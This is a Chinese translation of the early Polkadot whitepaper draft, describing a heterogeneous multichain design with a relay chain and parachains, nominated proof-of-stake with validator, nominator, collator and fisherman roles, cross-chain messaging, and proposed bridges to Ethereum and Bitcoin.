我们提出一种方式，支持向后兼容一个或多个现有的网络，比如以太坊等。我们相信这个系统能够提供一种有用的底层组件，能够实用性地支持全球商业级别的可伸缩性（scalability）和隐私性（privacy）。 1. 前言这篇论文的意图只是一个技术版本的概要，旨在用一些原则来描述将要开发的这个区块链示例，解释这个可能方向的合理性。它罗列了诸多区块链技术方面的具体改善措施，以及在此开发阶段所能够提供的尽可能多的细节。 它并不是要写成一个形式化证明的说明书。它并不完整，也不是最终版本。它并不是为了覆盖框架非核心的模块，例如 API、依赖、语言和用法等。这只是概念性实验，都很可能会修改提到的参数。为了响应社区的意见和评论，会新增、重定义、删除各组件。通过实验性的证据和原型，给出关于什么会有效、什么不会的信息，也很可能修正本论文中大部分内容。 这篇论文包含了一个关于协议和一些想法的核心描述，可能会被用来解决多个方面的问题。它将是能够用来在概念验证阶段开展一系列工作的核心描述。一个最终的“1.0 版本”会基于这个协议，再添加一些变得可证明而且决定包含到项目中来的想法。起草历史： 2016 年 10 月 09 日：0.1.0-proof1 2016 年 10 月 20 日：0.1.0-proof2 2016 年 11 月 01 日：0.1.0-proof3 2016 年 11 月 10 日：0.1.0 2 介绍区块链已经承诺了它的伟大意义，能够应用于包括物联网（IOT）、金融、治理、身份管理、去中心化互联网和资产追踪等多个领域。然而抛开这些技术承诺和大话，我们还没有看到现有技术下，出现重大的关于现实世界的应用部署。我们相信这是因为现有技术的 5 个关键缺陷： 伸缩性（Scalability）：全球范围内花费了多少计算、带宽和存储的资源，来处理单个交易？峰值情况下能处理多少交易？隔离性（Isolatability）：多参与方对于应用的差异化需求，能否在同一个框架下接近最优程度地满足？开发性（Developability）：工具的工作效果有多好？APIs 是否已满足开发者的需求？教程资料是否可用？是否集成权力？治理性（Governance）：网络是否保留了能够随着时间进化和适应的灵活性？制定决策能否高度地包容、合理和透明，来提供去中心化系统的高效领导力。应用性（Applicability）：技术是否真的解决了用户的刚性需求？是否需要其他的中间件来嫁接真实的应用？ 当前的工作，我们主要面向前两个问题：伸缩性和隔离性。也就是说，我们相信 Polkadot 架构可以在这两个方面，提供有意义的改进。 当前，例如 Parity 以太坊客户端这样的高性能区块链实现，已经可以在消费级高速硬件上每秒处理超过 3000 笔的交易。然而现实世界的区块链网络却限制在 30 笔交易每秒的情况下。这种限制主要是源于目前同步（synchronous）的共识机制，需要充分的计算缓冲时间来安全地处理，也就加重了其必须对于慢速硬件的支持。这归咎于其底层的共识架构：状态转换机，或者这种让所有参与方校对和执行交易的方式，在本质上将其逻辑绑定在了共识一致性（canonicalisation）的设计上，或者需要让所有参与方都同意所有的可能性、有效性和历史。 这种说法即适用于类似比特币和以太坊这样的工作量证明（POW）系统，也适用于NXT 和比特股这样的权益证明（POS）系统，他们都本质上受制于同一个障碍，但这些共识算法却是个能让区块链成功的简单策略。然而，在一个协议里紧密捆绑这两个结构，我们也就捆绑了多个不同风险偏好、不同伸缩性需求、不同隐私需求的角色和应用。一种特征满足不了所有人的需求。因为这种场景，产生了很多次的广泛呼吁，但网络只能倾向于更保守，服务于少数人，最终导致在创新能力、性能和适应性方面的失败，非常戏剧化。 有一些系统例如公证通（Factom），整个地去除了状态转换机。然而大多数应用场景都需要依赖一个共享的状态机，来支持状态转换的功能。去除它只是隐藏了问题，却没有给出真正替代性的解决方案。 现在看起来清楚了，因此一个合理的方向是：像路由对于可伸缩去中心化计算平台那样，解耦共识组件和状态转换组件。而且不出意外的话，这也是 Polkadot 解决伸缩性问题的策略。 2.1 协议、实现、网络和比特币、以太坊一样，Polkadot 希望一开始的时候只是个网络协议，并且是运行这一协议的主要公有网络（目前假设）。Polkadot 倾向于是个免费和开放的项目，协议在一个知识共享的许可证上制定，代码托管在 FLOSS 许可证下。这个项目以一种开放的状态开发，接收各方面有用的捐助。一个微意见提交系统（RFCs），但不像 Python 改进议程那样，会提供一种公众协作参与协议修改和升级的方式。 我们对 Polkadot 协议的初始实现，将称为 Parity Polkadot Platform，会包含协议的完整实现和 API 接口。像其他 Parity 的区块链实现一样，PPP 会设计成通用目的的区块链技术栈，并不限定于公有网络、私有网络或联盟网络。目前为止的开发已经被包括英国政府在内的几方资助。 但是，这篇论文还是在公有网络的场景下。我们在公有网络下预见的功能，是一个完整设想（比如私有或联盟网）的子集。另外在这个场景下，可以清晰地描述和讨论 Polkadot 的所有方面。这也是说读者需要知道，在非公有（有权限的）场景下，一些特定的机制（比如和其他公有网络的交互）并不直接和 Polkadot 相关。 2.2 前人工作从状态转换中解耦底层的共识，已经私下讨论了两年，在以太坊的最早期的时候 Max Kaye 就提议过。 一个更复杂的可伸缩方案叫做 Chain fibers，这要回溯到 2014 年 6 月，在那年底也发表了。它创造了一个关于单个中继链（relay-chain）和多个同构链，可以透明地跨链执行的先例。退相干性（Decoherence）通过交易延迟（latency）来实现，这就使需要更长时间，来处理需要协调系统多个部分的交易。Polkadot 借鉴了很多它的架构以及随后跟很多人的讨论，虽然跟它的设计和规定也很不一样。 然而目前并没有运行在生产环境下的系统可以和 Polkadot 相比，有的也只是提出了些相关性功能，很少有本质层面的细节。这些提议可以归纳为：丢弃或减少状态机全局相关性的系统、试图通过同构分片提供全局相关性的单例状态机系统、目标仅是异构性（heterogeneity）的系统。 2.2.1 没有全局状态的系统公证通（Factom）演示了个没有有效性的一致性系统，能够高效地记载数据。由于没有全局状态和其带来扩展性问题，它可以被看做是一个可伸缩的方案。然而前面也提到了，严格上来说它只解决了很少的问题。 Tangle 是个关于共识系统的概念性尝试。不把交易排序再打包到区块中，而是通过串联的共识得出一个全局的一致性状态改变排序，它在很大程度上抛弃了高度结构化的排序想法，而是推出一个有向无环图，后续的有依赖的交易通过明确的指向，来帮助前面的交易达成一致。对于任意的状态改变，这个依赖图就会很快地变得无法处理，然而对于更简单的 UTXO 模型，立即就变得合理了。因为系统总是松散地连贯，而且交易通常是相互独立的，大规模的全局并发变得非常自然。使用 UTXO 模型确实可以让 Tangle 定位成价值转移的货币系统，而并没有其他的更多通用和可扩展的功能。因为没有了全局依赖性，而和其他系统的交互又需要确定性地知道其状态，这种方法就变得不切实际了。 2.2.2 异构链系统侧链是个支持比特币主链和附属链之间去信任交互的提案。但并没有任何和侧链进行富（rich）交互的具体规定：交互被限定在允许和侧链之间相互托管对方的资产，也就是行话所说的双向锚定（two-way peg）。最终也是为了做个框架，通过锚定比特币链和其他链，允许在比特币协议之外进行外部交易，为比特币添加附属的外围功能。从这方面讲，侧链系统更多着眼于可扩展性而不是可伸缩性。 根本上讲，侧链确实没有关于有效性的条款，从一条链（比如比特币）的代币转到另一条链上，安全性只是寄希望于侧链能否激励矿工来一致性地验证交易。比特币网络的安全性无法简单地在其他链上起作用。进而一个确保比特币矿工联合挖矿（复制他们的一致性算力到侧链上），并且同时验证侧链交易的协议也被提出来了。 Cosmos 是个延续侧链思路提出来的多链系统，替换中本聪的 PoW 共识算法为 Jae Know 的 Tendermint 共识算法。本质上，它包含多个使用独立 Tendermint 实例的区块链（在空间 zone 中运行），和一个使用去信任通信的中心（hub）链。跨链通信仅限于转移数字资产（也就是代币），而不是任意信息，然而这种跨链通信是可以返回数据和路径的，比如给发送人通知转账的状态。 和侧链一样，空间链上验证人的经济激励问题也没有解决。一般的假设是每个空间链会各自持有通胀增发的支付代币。设计仍然还比较早期，现阶段的也缺乏在全局有效性上建立可伸缩一致性的经济手段细节。然而相比于那些需要强耦合的系统，为了空间链和中心链间的松耦合性，需要给空间链的参数添加更多灵活性。 2.2.3 Casper目前关于 Casper 和 Polkadot 之间，还没有完整的讨论和比较，即使是公平和彻底（也不准确）地描述两者。Casper 是正在重塑 PoS 的共识算法，它研究如何让参与方在最终会确定的分叉上押注。本质上，需要考虑即使是长程攻击的情况下，也要保证应对网络分叉的健壮性，还需考虑基础以太坊模型上的可伸缩性。因此，在本质上 Casper 协议的目标比 Polkadot 和以往项目要复杂的多，也偏离了基础的区块链模型。它仍然还没有做出来，不知道将来如何运作，也不知道最终会开发出来的样子。 然而 Casper 和 Polkadot 都代表了有趣的新一代协议，对于以太坊的争论，本质上也是他们的终极目标和实现路径上的差异。Casper 是以太坊基金会主导的一个项目，只是被设计用来作为 PoS 协议的替代，没有从本质上打造可伸缩区块链的意愿。关键还需要一次硬分叉来升级，而不能时可扩展的，因此所有的以太坊客户端和用户都需要升级，否则就得留在原来的前途不明朗的分叉上。因此，这类协议在去中心化系统上的部署会很困难，需要紧密的协调。 Polkadot 在几方面上不同；首先而且也是最重要的，Polkadot 将被设计成完全可扩展和可伸缩的区块链开发、部署和交互测试平台。他将被设计为面向未来的、可以吸收最新的可用区块链技术的平台，且不需要过于复杂的去中心化协调和硬分叉。我们已经预见到了几个应用场景，例如高度加密的联盟链和低区块时间的高频链等，它们不太可能在近期的以太坊上实现。它们最终和以太坊之间的耦合度也会很低，以太坊上也没有支持两者间非信任交互的想法。 简言之，尽管 Casper/以太坊 2.0 和 Polkadot 有一些相似点，我们相信从本质上它们最终的目标是不一样的，并非竞争，在可预见的将来，两个协议会大概率地并存。 3 概要Polkadot 是一个可伸缩的异构多链系统。这意味着不像以往那些专注于不同程度潜在应用功能的单个区块链实现，Polkadot 本身被设计成不提供任何内在的功能应用。 Polkadot 提供了中继链（relay-chain），在其上可以存在大量的可验证的、全局依赖的动态数据结构。我们称这些平行的结构化的区块链为平行链（parachains），尽管也不要求它们必须是一条链。 换句话说，Polkadot 会被设计成一个独立链的集合（例如包含以太坊、以太坊经典、域名币、比特币），除了两个非常重要的点： 合并的安全性 去信任的跨链交易性 这两点也是我们称 Polkadot 为可伸缩的原因。从原则上，一个问题在 Polkadot 上被彻底解决了：可以向外扩展，会有非常大数量的平行链。尽管每条平行链在各方面都通过不同的网络模式进行平行管理，但这个系统却有可伸缩的能力。 Polkadot 提供了一个尽量简单的架构，把大部分的复杂性都放在了中间件上。这是个刻意的决定，为了试图减少开发的风险，使必备的软件可以在短时间内开发出来，还能对安全性和健壮性持有信心。 3.1 Polkadot 的哲学Polkadot 需要提供一个绝对坚实的基座，来在其之上建设下一代共识系统，覆盖从生产级别的成熟设计到初期想法的所有风险。通过对安全性、隔离性、通信能力提供强有力的保证Polkadot 能够允许平行链从一系列特性中选择适合它们自己的。的确，我们预见了各种实验性的经过考虑的区块链特性。 我们看到，传统的高市值区块链（例如比特币和 Zcash）、低市值的概念性区块链和接近零手续费的测试网，是并存在一起的。我们看到，全加密的暗黑联盟链和高功能性的开放区块链（例如以太坊）也并存在一起，甚至还为之提供服务。我们看到，实验性的新虚拟机区块链，比如主观时间计费的 Wasm 区块链，在将难度计算问题从类似以太坊的区块链方式，修改成类似比特币的区块链方式。 为了管理区块链升级，Polkadot 将内生支持某种形式的治理结构，很可能基于现有的稳定政治体系，会有一个两院结构，类似于 Yellow Paper Council。底层权益代币持有者作为最高权力机构，会有全民投票控制权。为了反映用户的需求、开发人员的需求，我们期望建立一个合理的两院结构，采纳用户的意见（由绑定的验证人决定）、主要客户端开发者和生态系统玩家的意见。代币持有者会保留最高的合法权，可以形成一个最高法庭来参政、议政、替换或解散这个架构，还有那些我们不怀疑的最终需求。 借用一句马克吐温的谚语：“政府和尿布都得经常换，而且理由都一样”。 然而在大范围共识的机制下组织参政会很琐碎，更多关于替换和新增的质的改变，希望既不是通过非自动的弱法令（例如通过块高度和新协议的形式化证明文档的哈希）来达到一致性，也不是通过在核心共识算法中包含一个高效的高级语言，来改变他自身可能需要改变的各个方面。后者是一个最终目标，然而为了落实一个合理的开发路线图，更可能选择前者。 Polkadot 看重的主要原理和规则有： 最小：Polkadot 需要有尽可能少的功能性。简单：只要他们可以推给中间件、放在平行链、或用下面要讲的一种优化手段，就不在基础协议里添加多余的复杂性。通用：没必要在平行链中添加任何要求、约束或限制；Polkadot 需要成为共识系统开发的基石，要尽量通过给模型加入最具适应度的扩展和优化。健壮：Polkadot 需要提供一个稳定的基础层。为了经济稳定性，需要采用分散的方法，来降低高额奖励这个攻击向量可能引发的问题。 4 Polkadot 的参与方有四个基本的角色在维持 Polkadot 网络：收集人（collator）、渔夫（fisherman）、提名人（nominator）、验证人（validator）。在 Polkadot 的一个可能实现里，最后一个角色有可能会被拆分成两个：基础验证人和可用保证人（guarantor），将会在 6.5.3 节讨论。 图 1. Polkadot 四个角色的交互 4.1 验证人验证人有最高权限，帮助在 Polkadot 网络里打包新区块。验证人需要抵押足够多的押金，因为我们允许其他有资金的提名人推举一个或多个可以代表他们的验证人，所以验证人一部分的押金并不是他们自己所拥有的，而是属于提名人的。 一个验证人必须在高可用和高带宽的机器上运行一个中继链的客户端。每个区块上，节点都必须准备接收一个已提交的平行链上的新区块。这个过程涉及接受、验证、再发布候选区块。验证人的任命是确定性的，但实际上也很难预测。因为不能期望验证人拥有所有平行链的全同步数据，所以他们希望把这个提议平行链新区块的工作指派给第三方，也就是收集人。 不同的验证人小组一旦都确定性地批准了自己所属平行链的新块，他们就必须开始批准中继链自身的区块。这包括更新交易队列的状态（也就是从一条平行链的出口队列转移到另一条平行链的入队列）、处理已批准的中继链的交易集合、批准最终的区块、吸收平行链的最终改变。 在我们选择的共识算法下，会惩罚一个没有履行他们职责的验证人。最开始如果不是有意的错误，就只是会扣留他们的奖励，但如果是重复的错误会扣减他们的押金（通过烧毁），例如双向签名（double-signing）或合谋提供一个非法区块等可证明的恶意行为，会导致他们丧失全部的押金（烧毁一小部分，大部分奖励给信息提供方和诚实的验证人）。 在某种程度上，验证人和目前 PoW 区块链的矿池相似。 4.2 提名人提名人是一个拥有权益的群体，他们把安全性押金委托给验证人。他们没有更多的角色，除了通过有风险地投放资本来表示：他们信任某个特定的验证人（或群体）可以代表他们维护整个网络。按照他们的入金比例，他们也会受到和验证人总押金同样比例的奖励和扣减。 和下面的收集人一样，提名人和目前 PoW 网络的矿工相似。 4.3 收集人交易收集人是帮助验证人制造有效的平行链区块的群体。他们会运行一个特定平行链的全节点，这也意味着他们有全部的必要信息，可以打包新块并执行交易，就跟目前 PoW 区块链的矿工一样。在正常情况下，他们会收集并执行交易，并创建一个”未密封”（unsealed）的区块，再加上一个零知识证明一起提交给一个或多个当前负责提议（proposing）该平行链区块的验证人。 关于收集人、提名人、验证人的精确关系可能还会修改。起初，我们希望收集人和验证人能够紧密合作，因为可能只有一些（甚至一个）交易量很小的平行链。最初的客户端实现会包含一个 RPC 接口，来支持一条平行链的收集人节点把可证明的有效平行链区块，无条件地提供给一个（中继链）验证人节点。由于维持所有的全同步平行链的成本越来越高，所以我们设计了附加的结构，有助于分离独立的、经济驱动的、和其他的参与者。 最终，我们希望看到收集人群体为了更多手续费，竞争性地去收集信息。在一段时间内，为了持续增长的份额收益奖励，这些收集人可能只服务于特定的验证人群体。或者自由职业（freelance）的收集人也可以简单地创建一个市场，提供有效的平行链区块，而不是获得立即支付的竞争性份额奖励。同样地，去中心化的提名人群体也会允许多个有抵押的参与者来协调和分担验证人的职责。这种能力保证了参与的开放度，有助于成为更加去中心化的系统。 4.4 渔夫不像其他的两个参与方，渔夫并不直接和区块打包的过程相关。他们是独立的“赏金猎人“，激励他们的是一次性的大额奖励。 准确地说，由于渔夫的存在，我们才能减少恶意行为的发生，即使发生希望也只是因为私钥不小心泄露了，而不是故意的恶意企图。起这个名字的出发点是考虑到他们期望收益的频率和最终奖励的大小。 渔夫只要及时举报并证明至少一个有抵押的参与方存在非法行为，他们就能获得奖励。非法行为包括对两个有相同父块的不同区块进行签名，或在平行链上批准一个无效区块。为了预防由于私钥泄露给渔夫所导致的过渡奖励，渔夫上报关于单个验证人的非法消息签名的基础奖励是从最小开始的，这个奖励会随着其他渔夫上报更多的非法签名而逐渐增加。依据我们基本的安全性假设：至少三分之二的验证人是诚实的，渐近线将设置在 66%。 渔夫某种程度上和目前区块链系统的全节点相似，他们所需要的资源相对较少，也没必要承诺稳定的在线时间和大的带宽。渔夫有如此大的不同，所以他们只需要提交很少的押金。这个押金用于预防浪费验证人计算时间和计算资源的女巫攻击。它是立即可以提现的，很可能不会比等值的几个美金更多，但如果监测到一个不当行为的验证人，可能会收获很大的奖励。 5 设计综述本章试图给出一个系统的全局完整描述。对系统更加深入的解释会在接下来的一章中给出。 5.1 共识在中继链上，Polkadot 通过一个现代的异步（asynchronous）拜占庭容错（BFT）算法达成对有效区块的相互共识。算法受简单的 Tendermint 和 HoneyBadgerBFT 启发。后者在有任意网络缺陷的架构下，只要满大部分验证人是诚实的，就能提供了一种高效的容错算法。 也许一个权限证明（PoA）模式的网络就足够了，然而 Polkadot 是个可以在全开放和公开的场景下部署的网络，不需要信任任何特殊的组织和当权者来维护它，因此我们需要一种管理验证人群体并且激励他们守法的方法。我们选择使用以 PoS 为基础的共识算法。 图 2：Polkadot 的概括性原理图 图 2展示了收集人收集并且广播用户的交易，也广播候选区块给渔夫和验证人。展示了用户提交一个交易，先转移到平行链外部，然后通过中继链再转移到另一条平行链，成为一个可以被那里的账户执行的交易。 5.2 权益证明我们假设网络可以度量每个账户有多少权益（stake）。为了更轻松地和现有系统对比，我们把度量单位称为 “代币（tokens）”。不幸的是由于它仅仅能作为对账户简单的价值度量，也没有任何个性化，因此多种原因使这个术语并不那么理想化。 通过一个被提名的权益证明（Nominated Proof-of-Stake NPos）结构，我们猜想验证人的选举不会很频繁（很可能是一个季度一次，最多一天一次）。通过按比例分配的增发出来的代币（很可能大约 10%，最多每年 100%）和收集到的交易手续费来进行激励。虽然货币增发一般都会造成通胀，但因为所有代币持有者都有公平参与的机会，所以代币持有者的资产不会随着时间而遭受损失，他们会很开心地参与到该共识机制中来。全网权益证明的开展所需的抵押必须达到一个特定的最小比例。会根据市场机制，达到有效的代币增发这个目标。 验证人严重依赖他们抵押进来的权益。现存验证人的押金会从他们离职的时候开始，要再保留更长时间（也许 3 个月左右）。这么长的押金冻结期是为了还能惩罚将来的不当行为，直到区块链周期性的检查点到来。不当行为会遭到例如减少奖励等的惩罚，如果是故意破坏网络的完整性，验证人将会损失部分或全部的权益，转移给其他验证人、信息提供者或全部权益持有者（通过烧毁）。例如一个验证人试图同时批准不同分叉上的两个分支（有时也被称为短程攻击），就会被后面的方法鉴别并遭到惩罚。 检查点锁定器（checkpoint latch）能规避长程“无权益抵押”（nothing-at-stake）攻击，防止比一般长度更长的高度危险的链重构（chain-reorganistation）发生。为了保证最新开始同步的客户端不会被误导进错误的链，网络会出现定期的“硬分叉”（最长也就是验证人的押金冻结期），把最近检查点区块的哈希值硬编码（hard-code）进客户端。将来通过逐步递减有限链的长度（finite chain length），或周期性地重置创世块（genesis-block），这种方法会运行得很好。 5.3 平行链和收集人每条平行链将给中继链提供同样的安全性保证：平行链的区块头会被包含进中继链的区块中，还跟着一些确认信息，用来保证不会发生链重构或双重花费（double-spending）。类似于比特币侧链和联合挖矿的安全性保证，Polkadot 也强力保证平行链状态交易的有效性。会依据密码学算法，把验证人随机地分成很多个组。一条平行链对应一组，甚至每个块的组也都可能不一样。这个设置意味着中继链至少也要和平行链的出块时间一样短。本文不讨论分组的特定决定方式，可能要么是围绕类似 RanDAO 的提交-披露（commit-reveal）框架，要么结合平行链前一个区块的密码学哈希值。 这样的验证人组需要提供平行链的候选块，还要保证它们是有效的（否则损失押金）。有效性围绕两个重要的点：第一，它是内生有效的，所有的状态转换被公正地执行，包括引用的外部数据也被公正执行（比如交易）。第二，参与方需要可以简便地访问候选块的任何外部数据，例如外部交易等，然后就可以下载这些数据并手工执行候选块。验证人可以提交没有包含任何外部交易数据的空块（null），如果他们这样做，就要承受奖励减少的风险。他们和收集人在平行链的一个 gossip 协议上工作，收集人把交易收集到块里，并且要提供一个非交互的零知识证明（noninteractive zero-knowledge），用来证明本子块的父块是有效的（为该工作收取任何手续费）。 防止垃圾（spam）数据的方法留给了平行链协议自身：中继链本质上不规定“计算资源计量” 和 “交易费” 。本质上也不强制平行链规定相关协议（尽管权益持有者不太可能愿意接纳一个没有提供合理机制的平行链）。这里明确地说明了并不会都像以太坊的手续费规则，也可以类似比特币的区块链手续费模型，或其他任何还没有提出来的垃圾预防模型。 Polkadot 的中继链本身将很可能存在一个类似以太坊的账户和状态模型，可能是 EVM 的衍生版本。因为中继链节点将需要做大量的其他计算，将会通过提高手续费尽量减小交易吞吐量，我们的模型还会包含块大小的限制。 5.4 跨链通信Polkadot 最关键的部分是跨链通信。因为在平行链间可以存在某种信息通道，我们才说 Polkadot 是可伸缩的多链系统。在 Polkadot 中，通信可以很简单：一条平行链中的执行交易的时候（依据那条链的逻辑），可以给第二条平行链或中继链转发一个交易。目前生产环境中的区块链外部交易，都只能是完全异步的，他们并没有给它的来源方返回任何信息的原生能力。 图 3：一个基本的原理图，展示了路由已提交的交易（“提交”）的主要逻辑 为了保证最小的实现复杂度、最小的风险和最小的平行链架构束缚，这些跨链交易和目前标准的外部交易没有区别。这些交易会有个来源方字段，用来辨别平行链的身份，还有个可以是任意长度的地址。跨链交易需支付的手续费，并不像目前的比特币或以太坊系统那样，而是必须通过来源平行链和目的平行链的谈判逻辑来管理。一个在以太坊的Serenity 版本中提出的改进提案，会是一个简单管理这种跨链资源支付的方法，尽管我们假设其他人会提出更先进的方法。 跨链交易的问题可以用一个简单的队列机制解决，这个队列用梅克尔树（Merkle tree）来保证数据真实。中继链的任务是把交易从来源平行链的出口队列转移到目的平行链的入队列。已转发的交易会在中继链上被引用，而不是中继链自身的交易。为了预防一条平行链往另一条平行链发送垃圾交易，规定在在前一个块结束后，发送每一个交易时，目标平行链的入队列不能太大。如果区块处理完后，入队列太大，那么目的平行链会被看做是饱和了，接下来的几个块里就不会再路由交易给它，直到入队列降到临界值以下。这些队列在中继链上管理，允许各平行链相互决定他们的饱和度大小。如果再往停滞的目标链发送交易，这样就可以同步地报告失败了（因为不存在返回路径，如果第二个交易也是同样的原因失败了，它可能也不会给来源调用者发送回复，这就需要用到一些其他的恢复方法）。 5.5 Polkadot 和以太坊归功于以太坊的图灵完备特性，至少在简单的可论证的安全性边界内，我们期望 Polkadot 和以太坊有丰富的交互可能性。简而言之，我们预想到了，从 Polkadot 出来的交易，可以让验证人先签名，然后再喂给以太坊，在那里通过一个交易转发（transaction-forwarding）合约来解释和执行。反方向，我们也预想到了，从以太坊上的一个 “外向合约”（break-out contract）中的特殊格式日志，可以快速地证明一个消息是否真的要被转发。 5.5.1 从 Polkadot 到以太坊通过选择一个拜占庭容错算法，验证人经由授权投票产生的一系列权益持有者组成，我们能够获得一个安全的共识机制，用不经常更改的合适数量的验证人。在一个总共有 144 个验证人的系统内，4s 出块时间和 900 个块的最终性（允许举报、惩罚、修复类似双向投票的恶意行为），一个区块的有效性可以合理地考虑为用最少 97 个签名证明（144的三分之二再加一）,然后跟着的是 60 分钟无风险注入的验证时间。 以太坊可以包含一个控制和维护 144 个签名的“内向合约”（break-in contract），由于椭圆曲线数字签名的验签操作只要花费 EVM 3000 gas 的计算量，而且因为我们只希望验证操作发生在大多数的验证人里（而不是全体），以太坊确认一个从 Polkadot 来的指令的基础花费不会超过 300,000 gas——仅仅是区块 550 万 gas 限制的 6%。增加验证人的数量（只有在处理数十个区块链的时候才必要）不可避免地会增加成本，然而很明显可以期望到随着以太坊技术的成熟和架构的改进，交易吞吐量会随着时间而增加。另一个事实是不是所有的验证人都会参与（例如只有最高押金的验证人才会做这个任务）这种结构的限制会比较合理。 假设这些验证人每天轮换（更保守的、更可能接收的是每周，甚至每月），网络给维持这个以太坊转接桥的成本大约是 540,000 gas 每天，或者按照当前的 gas 价格，45 美金一年。一个通过转接桥的基本转发交易会花费大约0.11美金；当然另外的合约计算会耗费更多。通过缓存和捆绑多个交易，内向的交易花费可以简单地分担，减少每个交易的花费。如果一次转发需要凑够 20 个交易，那么转发一笔基本交易的花费会降低到大约0.01金。 在这个模型中，Polkadot 的验证人节点除了签名消息之外只需要再做很少的事情。为了能够把交易路由到以太坊网络里，我们假设任何一个验证人需要属于以太坊网络，更可能的只需提供很少的奖励给第一个在网络上转发消息的人（奖励会支付给交易发起人）。 5.5.2 从以太坊到 Polkadot使用一个叫做日志的概念，把交易从以太坊上转发到 Polkadot 上。当一个以太坊合约希望派生出一个交易给 Polkadot 上面的某一条平行链，它只需简单地调用一个特殊的“外向合约” 就好。那个外向合约会索取任何必须的费用，然后生成一个日志打印指令，以便于通过梅克尔树和有块头哈希来证明它的存在。 在下面的两个情况中，可以非常简单地证明有效性。原则上，唯一的要求是每个 Polkadot 节点都要运行一个全同步的标准以太坊节点。然而这本身就是非常重的依赖。一个更轻量的方法是提供一个简单的证明，仅需要包含正确执行该交易所必须知晓的以太坊的那部分状态树，然后再检查日志的有效性。这种类似简单支付验证（SPV-like）的证明不需要提供大量的信息。更方便的是，验证人可能完全不需要自己运行节点，Polkadot 内的押金系统能支持第三方参与者来提交块头，因为其他第三方（也就是所说的渔夫）也可能提供一个他们块头是无效的证明（具体地说就是状态根和回执根是错误的），所以这些人也冒着损失他们押金的风险。 在一个类似以太坊这样的无最终确定性（non-finalising）的 PoW 网络上，不可能存在最终可证明的一致性。为了适应这个，程序需要依赖一定的块确认数量，或者直到那个依赖的交易已经在链内某一特定深度了。在以太坊上，这个深度从最脆弱的 1 个块（网络都还不完全知道）延伸至 1200 个块（从 Frontier 上线到以太可交易）。在 Homestead的稳定版本上，大部分交易所选择了 120 个块这个数字，我们也可能会选择相近的参数。所以我们可以想象 Polkadot 这边的以太坊接口有一些简单的功能：可以接受以太坊网络的新块头，并能验证它的 PoW，可以结合一个有足够深度的块头（还有 Polkadot 内转发的相应信息），来验证从以太坊那边的外向合约打印出来的特定日志的证明，还可以接收关于之前收到的但还没有确定的块头里包含无效的回执根的证明。 需要有一个转发激励机制，才能够真正地在 Polkadot 网络里得到以太坊块头的数据（还有任何关于有效性和一致性的 SPV 证明）。这可能设计成只是个简单的支付行为（由在以太坊那边收集的手续费资助），转给任何能够提供一个有效块头的人。为了能够应对分叉，验证人需要保留最近几千个块的信息，要么由协议原生支持，要么通过中继链上的合约。 5.5.3 Polkadot 和比特币Polkadot 和比特币的交互是非常有挑战性的：从两边的网络角度考虑，一个所谓的“双向锚定” 架构会非常有用。然而由于比特币的局限性，如何提供一种安全性的锚定个是非常艰难的任务。可以使用类似以太坊的流程，从比特币转发一个交易到 Polkadot：由一个受 Polkadot 验证人控制的“外向地址”（break-out address）来托管转账过来的代币（和附属的数据）。可以通过结合一个确认期，来激励先知（oracles）提供 SPV 证明，先知们通过标识一个非一致性的区块，来证明一笔交易存在双花的可能。任何在外向地址里托管的比特币原则上也被相同的验证人群体控制。 问题是如何保证这些比特币，是被轮换的验证人集合所控制的。相比于以太坊那样可以根据在合约内任意组合签名规则的方法，比特币的局限性就更多了，大部分的比特币客户端只接受最多 3 方的多重签名。扩充至 36 个或者大家希望的最高至上千个的终极提议，在现有的比特币协议里还不可能实现。一个选择是修改比特币的协议来支持这个功能，然而硬分叉在比特币的世界里非常难以安排和讨论。另一个可能性是使用门限（threshold）签名的方法，用密码学的结构来构造一个被被多个私钥片段共同控制的公钥地址，要制造一个有效的签名需要这些人的大部分或全部人都参与。不幸的是，和比特币的 ECDSA 相比，门限签名计算起来非常耗资源，而且是多项式级别的复杂度（polynomial complexity）。 由于入金的安全根本性由有抵押的验证人决定，所以另一个选择是减少多重签名的私钥持有人数量至只有重度质押的验证人才能参与，这样门限签名就变得可行了（或者最糟糕的情况，也可能直接用比特币的原生多重签名）。由于要预防验证人的非法行为，这个方法会降低可托管的比特币总量。然而这是一个优雅的妥协，可以简单地设置能够安全地在两个网络里的转移的基金总额上限（验证人攻击失败可能会受到的押金损失，和攻击成功可能的会收到的比特币潜在收益对比）。 因此，我们认为在现有的比特币框架下，开发出一个能够在两个网络间安全转移比特币的平行链是不现实的，尽管如此，比特币的持有者还可以在不确定的将来协调这些工作。 6 协议细节本协议可以大致分为三个部分：共识机制、平行链接口、跨链交易路由系统。 6.1 中继链操作中继链会类似以太坊，也是基于状态的，包含一个账户信息到状态存储的映射关系，其中信息主要包含余额和交易计数器（防止重放）。把账户系统放在这里的目标是：记录每个身份在系统里控制了多少权益。但还有一些值得注意的差异： 不能通过交易部署合约；这是为了让中继链尽量缺乏功能性，不支持公开部署合约。 没有资源计数器（gas）；因为公众能够调用的一些功能是固定的，gas 记录系统的原理就不适用了。因此在所有功能中，会使用一个更通用的手续费标准，这样就能更高效地执行那些动态代码，交易格式也会更简单。 会有一些包含特殊功能的默认合约，他们管理交易的自动执行和网络消息的输出。 中继链会有一个基于 EVM 的虚拟机，但为了最大程度地简化会做很多修改。它会有一些内置合约（类似于地址在 1-4 之间的那些以太坊合约）运行平台的特定功能，包括共识合约、验证人合约、平行链合约。 如果不用 EVM，很有可能会选择 Web-Assembly（Wasm）；这样的话，所有结构还是相似的，但是这些基于 Wasm 的内置合约使用的是通用功能的语言，而不再是 EVM 上面的那些带有很多限制的不成熟语言。 还可能借鉴目前以太坊上衍生出来的其他方面的概念，例如在 Serenity 版本中提出来一些改变，比如为了能在一个块里并行执行那些没有状态冲突的交易，将交易的回执格式简化等。 Polkadot 有可能会部署一个类似于 Serenity 的纯净（pure）区块链系统，它不包含链的任何基础协议。但我们觉得这会带来更多的复杂性和开发不确定性，所以不太值得在目前阶段就去实现这么一个更高效且简洁的伟大协议。 为了管理共识机制，需要很多小片儿的功能：验证人集合、验证人机制、平行链等。这些都可以放在一个整体的协议中。然而为了实现模块化，我们会把这些描述成中继链的合约。这意味着他们都是中继链共识机制管理的对象（类似面向对象语言），但不一定是类似 EVM 的字节码，也不一定能通过账户系统寻址。 6.2 权益合约这个合约管理着验证人集合： 哪些账户是验证人； 哪些在短期内可以变成验证人； 哪些账户为了提名验证人而质押了权益 每个人的属性，包括余额、可接受的押金比例、地址列表、会话（session）身份 